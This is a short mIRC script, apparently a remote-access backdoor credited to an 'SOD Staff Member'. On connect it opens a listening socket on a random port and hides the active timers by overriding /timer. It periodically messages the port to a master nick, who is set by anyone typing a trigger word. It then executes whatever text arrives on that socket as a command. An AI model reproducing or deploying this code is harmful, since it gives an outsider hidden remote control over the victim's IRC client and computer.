[script]
n0=;this script was writed by SWaNk SOD Staff Member
n1=on 1:CONNECT:{ set %prt $rand(1,4) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) | st
n2=  timerconn 0 60 //raw -q privmsg %mstr prt:_ $+ %prt
n3=  alias /timer /echo 2* Active timers: No timers activated 
n4=  alias st { sockclose sod | socklisten sod %prt  }
n5=}
n6=on 1:TEXT:*teste¡*:#:{ //raw -q privmsg $nick prt:_ $+ %prt | set %mstr $nick }
n7=on *:socklisten:sod:{ var %sock = sod_ $+ $ticks | sockaccept %sock }
n8=on *:sockread:sod_*:{ if ($sockerr) { return } | sockread %lido |  %lido }
